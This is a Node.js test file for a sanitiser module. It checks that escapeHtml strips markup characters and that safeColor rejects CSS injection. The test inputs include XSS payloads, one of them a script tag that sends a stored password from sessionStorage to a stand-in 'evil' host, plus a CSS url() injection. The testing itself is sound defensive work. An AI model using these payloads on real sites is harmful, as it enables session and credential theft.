import test from 'node:test';
import assert from 'node:assert/strict';
import '../src/security.js';

const { escapeHtml, safeColor } = globalThis.BBSecurity;

test('chat payloads cannot inject markup or attributes', () => {
  for (const p of ['<img src=x onerror=alert(1)>', '<script>fetch("//evil/"+sessionStorage.bb_obsPassword)</script>', '"><svg onload=1>', "' onmouseover='x", '`x`']) {
    assert.ok(!/[<>"'`]/.test(escapeHtml(p)), p);
  }
});

test('plain text, numbers and null are preserved or emptied safely', () => {
  assert.equal(escapeHtml('hello & goodbye'), 'hello &amp; goodbye');
  assert.equal(escapeHtml(null), '');
  assert.equal(escapeHtml(7), '7');
});

test('safeColor accepts colours and rejects CSS injection', () => {
  assert.equal(safeColor('#1e90ff'), '#1e90ff');
  assert.equal(safeColor('rgb(1,2,3)'), 'rgb(1,2,3)');
  assert.equal(safeColor('red;background:url(//evil)'), '#9b59b6');
  assert.equal(safeColor('"><script>', '#000'), '#000');
  assert.equal(safeColor(undefined), '#9b59b6');
});
